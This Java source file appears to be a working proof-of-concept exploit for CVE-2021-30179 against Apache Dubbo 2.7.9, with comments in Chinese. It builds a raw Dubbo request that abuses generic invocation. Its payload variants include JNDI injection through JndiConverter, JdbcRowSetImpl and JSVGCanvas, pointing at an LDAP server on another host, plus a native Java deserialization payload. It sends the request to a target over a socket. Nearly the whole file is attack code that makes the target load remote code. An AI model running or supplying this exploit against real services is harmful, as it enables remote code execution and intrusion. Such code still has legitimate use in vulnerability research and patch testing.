package dubbo.cve;

import dubbo.util.FileUtil;
import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;


import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;

/**
 * 测试版本: dubbo 2.7.9
 * 修复版本: dubbo 2.7.10
 */
public class CVE_2021_30179 {

    static String genericType = "raw";//raw   bean   nativejava
    static String dubbo_ip = "10.58.120.200";
    static int dubbo_port = 20880;
    static String ldapUri = "ldap://10.58.120.200:1389/fg4e1a";

    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
        Hessian2ObjectOutput body = new Hessian2ObjectOutput(bodyBaos);

        // set body
        body.writeUTF("2.7.9");
        body.writeUTF("com.pacemrc.dubbo.api.DemoService");
        body.writeUTF("");
        body.writeUTF("$invoke");
        body.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        body.writeUTF("sayHello");//接口的方法
        body.writeObject(new String[] {"java.lang.String"});//接口方法的参数类型

        switch (genericType) {
            case "raw":
                getRawReturnPayload2(body, ldapUri);
                break;
            case "bean":
                getBeanPayload(body, ldapUri);
                break;
            case "nativejava":
                getNativeJavaPayload(body, System.getProperty("user.dir")+ "/");
        }

        body.flushBuffer();

        Bytes.int2bytes(bodyBaos.size(), header, 12);
        baos.write(header);
        baos.write(bodyBaos.toByteArray());

        byte[] bytes = baos.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket(dubbo_ip, dubbo_port);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getRawReturnPayload1(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.batik.swing.JSVGCanvas");
        jndi.put("URI", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getRawReturnPayload2(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);

    }

    private static void getRawReturnPayload3(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();

        jndi.put("class", "com.sun.rowset.JdbcRowSetImpl");
        jndi.put("dataSourceName", "ldap://10.58.120.200:1389/nco5cx");
        jndi.put("autoCommit", "true");

        List<HashMap> list = new ArrayList<>();
        list.add(jndi);
        out.writeObject(new Object[]{list});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap map = new HashMap();

        map.put("generic", "bean");
        out.writeObject(map);
    }

    private static void getNativeJavaPayload(Hessian2ObjectOutput out, String serPath) throws IOException {
        byte[] payload = FileUtil.getBytesByFile(serPath);
        out.writeObject(new Object[] {payload});

        HashMap map = new HashMap();
        map.put("generic", "nativejava");
        out.writeObject(map);
    }
}
